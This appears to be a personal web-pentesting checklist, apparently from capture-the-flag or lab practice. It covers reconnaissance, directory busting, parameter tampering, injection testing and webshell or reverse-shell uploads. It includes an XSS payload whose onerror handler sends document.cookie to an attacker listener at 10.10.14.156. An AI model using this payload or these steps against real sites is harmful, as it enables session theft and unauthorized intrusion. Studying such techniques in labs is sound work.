
What's running
	check nmap
	look at web page
	view source code
	burp
		check X-Powered-By header

robots.txt

Google
	"technology/framework" exploit
	poc
	cve

What's the file structure
	Directory busting
	[[Public/InfoSec/Tools n Info/02 - Web Exploration/Fuzzing/gobuster|gobuster]]
	[[feroxbuster|feroxbuster]]

virtual hosts

checking for REST Endpoints or GET/POST parameters to exploit
	are there forms
	.ajax() call (if jQuery)
	.fetch 
	in browser
		forms: we find on the webpage - open the network tab in the dev tools of the browser - send off the form - see where the connection goes to in the network tab

Checking for REST Endpoints in the information we collected (source code or directory busting)

Parameters & Injections
	try changing id= 1 to 2 ... '
	"/item/13" <- change the 13 to 1 or 0
	html injections
		`<img src='http://10.10.14.156:8000/dog.jpg'>`
		`<img src='a' onerror='var i=new Image;i.src="http://10.10.14.156:8000/?"%2bdocument.cookie;'>`
	SQLi
	commands in the os's shell
	commands in programming language

Where ^
	forms
	parameters in url

webshell or revshell upload
	use what the system is built on; php, python django, vbscript node.js... perl might also work

